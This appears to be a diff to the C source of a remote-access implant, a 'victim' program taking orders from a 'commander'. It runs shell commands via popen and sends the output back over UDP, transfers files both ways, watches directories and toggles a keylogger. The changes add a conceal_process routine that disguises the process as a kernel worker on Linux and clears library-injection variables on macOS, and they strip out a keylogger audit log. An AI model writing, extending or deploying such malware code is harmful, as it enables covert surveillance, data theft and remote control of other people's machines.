-    snprintf(message, message_len, "keylogger stopped for %s", state->keylogger_device);
+    snprintf(message, message_len, "keylogger stopped");
     printf("%s\n", message);
-    state->keylogger_active = 0;
-    state->keylogger_device[0] = '\0';
 
     return 0;
 }
@@ -1041,6 +968,8 @@ static int execute_command(victim_state_t *state, const struct sockaddr_in *peer
         if (n > 0) {
             sent_output = 1;
             if (send_response_payload(state, peer_addr, CMD_EXEC_OUTPUT, buffer, (uint16_t)n) != 0) {
+                read_error = 1;
+            } else if (wait_for_stream_ack(state) != 0) {
                 read_error = 1;
             }
             continue;
@@ -1115,6 +1044,11 @@ static int send_file_to_commander(victim_state_t *state, const struct sockaddr_i
             failed = 1;
             break;
         }
+
+        if (wait_for_stream_ack(state) != 0) {
+            failed = 1;
+            break;
+        }
     }
 
     if (ferror(fp)) {
@@ -1143,13 +1077,16 @@ static int begin_file_upload(victim_state_t *state, const uint8_t *payload, uint
     }
 
     clear_upload_state(state);
-    state->upload_fp = fopen(path, "wb");
+    snprintf(state->upload_path, sizeof(state->upload_path), "%s", path);
+    snprintf(state->upload_temp_path, sizeof(state->upload_temp_path), "%s.part", path);
+    state->upload_fp = fopen(state->upload_temp_path, "wb");
     if (state->upload_fp == NULL) {
         snprintf(message, message_len, "file upload failed: %s", strerror(errno));
+        state->upload_temp_path[0] = '\0';
+        state->upload_path[0] = '\0';
         return -1;
     }
 
-    snprintf(state->upload_path, sizeof(state->upload_path), "%s", path);
     snprintf(message, message_len, "receiving %s", state->upload_path);
     return 0;
 }
@@ -1184,7 +1121,19 @@ static int finish_file_upload(victim_state_t *state, char *message, size_t messa
     }
 
     snprintf(completed_path, sizeof(completed_path), "%s", state->upload_path);
-    clear_upload_state(state);
+    fclose(state->upload_fp);
+    state->upload_fp = NULL;
+
+    if (rename(state->upload_temp_path, state->upload_path) != 0) {
+        snprintf(message, message_len, "file upload failed: rename: %s", strerror(errno));
+        remove(state->upload_temp_path);
+        state->upload_temp_path[0] = '\0';
+        state->upload_path[0] = '\0';
+        return -1;
+    }
+
+    state->upload_temp_path[0] = '\0';
+    state->upload_path[0] = '\0';
     snprintf(message, message_len, "stored file at %s", completed_path);
     return 0;
 }
@@ -1269,6 +1218,9 @@ static uint64_t compute_directory_signature(const char *path, int *exists, time_
     struct dirent *entry;
     struct stat dir_stat;
     uint64_t hash = 1469598103934665603ULL;
+    char **names = NULL;
+    size_t count = 0;
+    size_t capacity = 0;
 
     *exists = 0;
     *mtime = 0;
@@ -1286,20 +1238,41 @@ static uint64_t compute_directory_signature(const char *path, int *exists, time_
     *mtime = dir_stat.st_mtime;
 
     while ((entry = readdir(dir)) != NULL) {
-        char child_path[REMOTE_PATH_MAX * 2];
-        struct stat st;
-        const unsigned char *name = (const unsigned char *)entry->d_name;
-
         if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
             continue;
         }
+        if (count >= capacity) {
+            size_t new_cap = capacity == 0 ? 64 : capacity * 2;
+            char **new_names = realloc(names, sizeof(char *) * new_cap);
+            if (new_names == NULL) {
+                break;
+            }
+            names = new_names;
+            capacity = new_cap;
+        }
+        names[count] = strdup(entry->d_name);
+        if (names[count] == NULL) {
+            break;
+        }
+        count++;
+    }
+    closedir(dir);
+
+    if (count > 0 && names != NULL) {
+        qsort(names, count, sizeof(char *), (int (*)(const void *, const void *))strcmp);
+    }
+
+    for (size_t i = 0; i < count; i++) {
+        char child_path[REMOTE_PATH_MAX * 2];
+        struct stat st;
+        const unsigned char *name = (const unsigned char *)names[i];
 
         while (*name != '\0') {
             hash ^= *name++;
             hash *= 1099511628211ULL;
         }
 
-        if (snprintf(child_path, sizeof(child_path), "%s/%s", path, entry->d_name) >= (int)sizeof(child_path)) {
+        if ((size_t)snprintf(child_path, sizeof(child_path), "%s/%s", path, names[i]) >= sizeof(child_path)) {
             continue;
         }
 
@@ -1313,111 +1286,23 @@ static uint64_t compute_directory_signature(const char *path, int *exists, time_
         }
     }
 
-    closedir(dir);
+    for (size_t i = 0; i < count; i++) {
+        free(names[i]);
+    }
+    free(names);
+
     return hash;
 }
 
 static void send_watch_event(victim_state_t *state, const char *label, const char *path, const char *details) {
-    network_message_t message;
+    char payload[FILE_CHUNK];
 
     if (!state->session_active) {
         return;
     }
 
-    memset(&message, 0, sizeof(message));
-    message.message_type = MSG_DIRECTORY_EVENT;
-    snprintf(message.payload, sizeof(message.payload), "%s: %s (%s)", label, path, details);
-    message.payload_len = (int)strnlen(message.payload, sizeof(message.payload));
-    (void)send_console_message(&state->allowed_addr, &message);
-}
-
-static int execute_console_command(const struct in_addr *collector_addr, const char *command) {
-    FILE *pipe;
-    network_message_t message;
-    int status;
-    int sent_output = 0;
-
-    pipe = popen(command, "r");
-    if (pipe == NULL) {
-        char error[FILE_CHUNK];
-        size_t error_len;
-
-        snprintf(error, sizeof(error), "command failed: popen: %s\n", strerror(errno));
-        error_len = strnlen(error, sizeof(error));
-
-        memset(&message, 0, sizeof(message));
-        message.message_type = MSG_COMMAND_OUTPUT;
-        message.payload_len = (int)error_len;
-        memcpy(message.payload, error, error_len);
-        (void)send_console_message(collector_addr, &message);
-
-        memset(&message, 0, sizeof(message));
-        message.message_type = MSG_COMMAND_OUTPUT;
-        (void)send_console_message(collector_addr, &message);
-        return -1;
-    }
-
-    memset(&message, 0, sizeof(message));
-    message.message_type = MSG_COMMAND_OUTPUT;
-
-    while (fgets(message.payload, sizeof(message.payload), pipe) != NULL) {
-        sent_output = 1;
-        message.payload_len = (int)strnlen(message.payload, sizeof(message.payload));
-        if (send_console_message(collector_addr, &message) != 0) {
-            pclose(pipe);
-            return -1;
-        }
-        usleep(2000);
-        memset(message.payload, 0, sizeof(message.payload));
-    }
-
-    status = pclose(pipe);
-
-    if (!sent_output) {
-        static const char no_output[] = "(no output)\n";
-
-        memset(&message, 0, sizeof(message));
-        message.message_type = MSG_COMMAND_OUTPUT;
-        message.payload_len = (int)(sizeof(no_output) - 1);
-        memcpy(message.payload, no_output, sizeof(no_output) - 1);
-        if (send_console_message(collector_addr, &message) != 0) {
-            return -1;
-        }
-    }
-
-    if (status == -1) {
-        char error[FILE_CHUNK];
-        size_t error_len;
-
-        snprintf(error, sizeof(error), "command failed: pclose: %s\n", strerror(errno));
-        error_len = strnlen(error, sizeof(error));
-
-        memset(&message, 0, sizeof(message));
-        message.message_type = MSG_COMMAND_OUTPUT;
-        message.payload_len = (int)error_len;
-        memcpy(message.payload, error, error_len);
-        if (send_console_message(collector_addr, &message) != 0) {
-            return -1;
-        }
-    } else if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
-        char status_text[FILE_CHUNK];
-        size_t status_len;
-
-        snprintf(status_text, sizeof(status_text), "command exited with status %d\n", WEXITSTATUS(status));
-        status_len = strnlen(status_text, sizeof(status_text));
-
-        memset(&message, 0, sizeof(message));
-        message.message_type = MSG_COMMAND_OUTPUT;
-        message.payload_len = (int)status_len;
-        memcpy(message.payload, status_text, status_len);
-        if (send_console_message(collector_addr, &message) != 0) {
-            return -1;
-        }
-    }
-
-    memset(&message, 0, sizeof(message));
-    message.message_type = MSG_COMMAND_OUTPUT;
-    return send_console_message(collector_addr, &message);
+    snprintf(payload, sizeof(payload), "%s: %s (%s)", label, path, details);
+    (void)send_watch_message(&state->allowed_addr, payload, (int)strnlen(payload, sizeof(payload)));
 }
 
 static int copy_payload_string(const uint8_t *payload, uint16_t payload_len, const char *field_name, char *out, size_t out_len, char *error, size_t error_len) {
@@ -1453,100 +1338,53 @@ static size_t bounded_strlen(const uint8_t *data, size_t limit) {
     return len;
 }
 
-static int append_keylogger_audit(const char *action, const char *device_path) {
-    FILE *fp;
-    time_t now;
-
-    fp = fopen(KEYLOGGER_AUDIT_FILE, "a");
-    if (fp == NULL) {
-        perror("fopen keylogger audit");
-        return -1;
-    }
-
-    now = time(NULL);
-    fprintf(fp, "%ld %s %s\n", (long)now, action, device_path);
-    fclose(fp);
-
-    return 0;
-}
-
-static int send_console_message(const struct in_addr *collector_addr, const network_message_t *message) {
+static int send_watch_message(const struct in_addr *target_addr, const char *payload, int payload_len) {
     int sock;
-    struct sockaddr_in collector;
+    struct sockaddr_in target;
+    network_message_t message;
     ssize_t sent;
+    size_t copy_len;
+
+    memset(&message, 0, sizeof(message));
+    message.message_type = MSG_DIRECTORY_EVENT;
+    copy_len = (size_t)payload_len < sizeof(message.payload) ? (size_t)payload_len : sizeof(message.payload) - 1;
+    memcpy(message.payload, payload, copy_len);
+    message.payload_len = (int)copy_len;
 
     sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
-        perror("socket console");
         return -1;
     }
 
-    memset(&collector, 0, sizeof(collector));
-    collector.sin_family = AF_INET;
-    collector.sin_addr = *collector_addr;
-    collector.sin_port = htons(COLLECTOR_PORT);
+    memset(&target, 0, sizeof(target));
+    target.sin_family = AF_INET;
+    target.sin_addr = *target_addr;
+    target.sin_port = htons(COLLECTOR_PORT);
 
-    sent = sendto(sock, message, sizeof(*message), 0, (const struct sockaddr *)&collector, sizeof(collector));
+    sent = sendto(sock, &message, sizeof(message), 0, (const struct sockaddr *)&target, sizeof(target));
     close(sock);
 
-    if (sent != (ssize_t)sizeof(*message)) {
-        perror("sendto console");
+    if (sent != (ssize_t)sizeof(message)) {
         return -1;
     }
 
     return 0;
 }
 
-static uint16_t compute_checksum(const uint8_t *data, size_t len) {
-    uint32_t sum = 0;
-
-    for (size_t i = 0; i < len; i++) {
-        sum += data[i];
-        if (sum >> 16) {
-            sum = (sum & 0xFFFFu) + (sum >> 16);
+static void conceal_process(void) {
+#ifdef __linux__
+    const char *chosen = "[kworker/u16:4]";
+    (void)prctl(PR_SET_NAME, chosen, 0, 0, 0);
+#endif
+#ifdef __APPLE__
+    extern char **environ;
+    for (char **env = environ; *env != NULL; env++) {
+        if (strncmp(*env, "DYLD_INSERT_LIBRARIES=", 22) == 0) {
+            *env = "DYLD_INSERT_LIBRARIES=";
+        }
+        if (strncmp(*env, "DYLD_LIBRARY_PATH=", 18) == 0) {
+            *env = "DYLD_LIBRARY_PATH=";
         }
     }
-
-    return (uint16_t)(~sum & 0xFFFFu);
-}
-
-static const char *command_name(uint8_t command) {
-    switch (command) {
-        case CMD_DISCONNECT:
-            return "DISCONNECT";
-        case CMD_HEARTBEAT:
-            return "HEARTBEAT";
-        case CMD_KEYLOG_START:
-            return "KEYLOG_START";
-        case CMD_KEYLOG_STOP:
-            return "KEYLOG_STOP";
-        case CMD_EXEC_CMD:
-            return "EXEC_CMD";
-        case CMD_EXEC_OUTPUT:
-            return "EXEC_OUTPUT";
-        case CMD_FILE_GET:
-            return "FILE_GET";
-        case CMD_FILE_DATA:
-            return "FILE_DATA";
-        case CMD_FILE_PUT_BEGIN:
-            return "FILE_PUT_BEGIN";
-        case CMD_FILE_PUT_CHUNK:
-            return "FILE_PUT_CHUNK";
-        case CMD_FILE_PUT_END:
-            return "FILE_PUT_END";
-        case CMD_WATCH_FILE:
-            return "WATCH_FILE";
-        case CMD_WATCH_DIR:
-            return "WATCH_DIR";
-        case CMD_UNINSTALL:
-            return "UNINSTALL";
-        case CMD_OK:
-            return "OK";
-        case CMD_ERROR:
-            return "ERROR";
-        case CMD_ACK:
-            return "ACK";
-        default:
-            return "UNKNOWN";
-    }
+#endif
 }
